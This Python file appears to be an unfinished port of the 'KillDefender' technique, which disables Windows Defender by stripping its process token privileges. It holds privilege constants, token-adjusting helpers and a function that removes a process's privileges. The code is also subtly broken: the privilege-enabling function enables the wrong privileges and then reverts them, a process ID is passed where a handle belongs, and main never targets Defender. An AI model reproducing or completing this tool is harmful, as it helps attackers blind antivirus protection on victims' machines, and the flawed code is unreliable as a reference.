# Based on Pwn1sher's KillDefender: https://github.com/pwn1sher/KillDefender
import wmi
import win32api
import win32process
import win32security


DEBUG_PROCESS = win32process.DEBUG_PROCESS
TOKEN_QUERY = win32security.TOKEN_QUERY
TOKEN_ADJUST_PRIVILEGES = win32security.TOKEN_ADJUST_PRIVILEGES
TOKEN_ALL_ACCESS = win32security.TOKEN_ALL_ACCESS
SE_PRIVILEGE_ENABLED = win32security.SE_PRIVILEGE_ENABLED

# NT Defined Privileges

SE_CREATE_TOKEN_NAME              = "SeCreateTokenPrivilege"
SE_ASSIGNPRIMARYTOKEN_NAME        = "SeAssignPrimaryTokenPrivilege"
SE_LOCK_MEMORY_NAME               = "SeLockMemoryPrivilege"
SE_INCREASE_QUOTA_NAME            = "SeIncreaseQuotaPrivilege"
SE_UNSOLICITED_INPUT_NAME         = "SeUnsolicitedInputPrivilege"
SE_MACHINE_ACCOUNT_NAME           = "SeMachineAccountPrivilege"
SE_TCB_NAME                       = "SeTcbPrivilege"
SE_SECURITY_NAME                  = "SeSecurityPrivilege"
SE_TAKE_OWNERSHIP_NAME            = "SeTakeOwnershipPrivilege"
SE_LOAD_DRIVER_NAME               = "SeLoadDriverPrivilege"
SE_SYSTEM_PROFILE_NAME            = "SeSystemProfilePrivilege"
SE_SYSTEMTIME_NAME                = "SeSystemtimePrivilege"
SE_PROF_SINGLE_PROCESS_NAME       = "SeProfileSingleProcessPrivilege"
SE_INC_BASE_PRIORITY_NAME         = "SeIncreaseBasePriorityPrivilege"
SE_CREATE_PAGEFILE_NAME           = "SeCreatePagefilePrivilege"
SE_CREATE_PERMANENT_NAME          = "SeCreatePermanentPrivilege"
SE_BACKUP_NAME                    = "SeBackupPrivilege"
SE_RESTORE_NAME                   = "SeRestorePrivilege"
SE_SHUTDOWN_NAME                  = "SeShutdownPrivilege"
SE_DEBUG_NAME                     = "SeDebugPrivilege"
SE_AUDIT_NAME                     = "SeAuditPrivilege"
SE_SYSTEM_ENVIRONMENT_NAME        = "SeSystemEnvironmentPrivilege"
SE_CHANGE_NOTIFY_NAME             = "SeChangeNotifyPrivilege"
SE_REMOTE_SHUTDOWN_NAME           = "SeRemoteShutdownPrivilege"


def enable_debug_privilege():
    new_privs = (
        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_ENABLED),
        (win32security.LookupPrivilegeValue('', SE_RESTORE_NAME),win32security.SE_PRIVILEGE_ENABLED),
    )
    ph = win32api.GetCurrentProcess()
    th = win32security.OpenProcessToken(ph, TOKEN_ALL_ACCESS|TOKEN_ADJUST_PRIVILEGES)
    modified_privs = win32security.AdjustTokenPrivileges(th, 0, new_privs)
    win32security.AdjustTokenPrivileges(th, 0, modified_privs)

def get_all_processes():
    c = wmi.WMI(find_classes=False)
    procs = []
    for i in c.Win32_Process(["Caption", "ProcessID"]):
        procs.append(i)
    return procs

def get_procid_from_name(processname, proc_list):
    for process in proc_list:
        p_id = process.Handle
        p_val = process.wmi_property("Caption").value()
        if p_val == processname:
            return p_id
        else:
            continue

def get_pid(process_name):
    processes = get_all_processes()
    pid = get_procid_from_name(process_name, processes)
    return pid

def set_privilege_none(pid):
    token = win32security.OpenProcessToken(pid, TOKEN_ALL_ACCESS)
    win32security.AdjustTokenPrivileges(token, 1, None)
    pass

def main():
    enable_debug_privilege()

if __name__=="__main__":
    main()